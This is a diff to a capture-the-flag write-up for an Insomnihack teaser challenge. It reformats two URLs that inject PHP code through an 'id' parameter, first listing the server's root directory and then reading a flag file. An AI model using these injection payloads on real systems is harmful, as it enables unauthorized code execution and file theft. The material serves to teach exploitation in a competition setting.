@@ -90,7 +90,7 @@ Let's try it.
 ## Exploit
  
 1. We start by listing the root directory by visiting the following URL:
-http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(scandir(%27/%27));/*
+`http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(scandir(%27/%27));/*`.
 
 This outputs the following result:
 ```
@@ -156,7 +156,7 @@ This outputs the following result:
 
 2. It worked! Now that we got the path to the flag, all that's left is to
 actually print it by visiting:
-[http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(file_get_contents(%22/flag%22));/*](http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(file_get_contents(%22/flag%22));/*).
+`http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(file_get_contents(%22/flag%22));/*`.
 
 Aaaand, here's the flag:
 
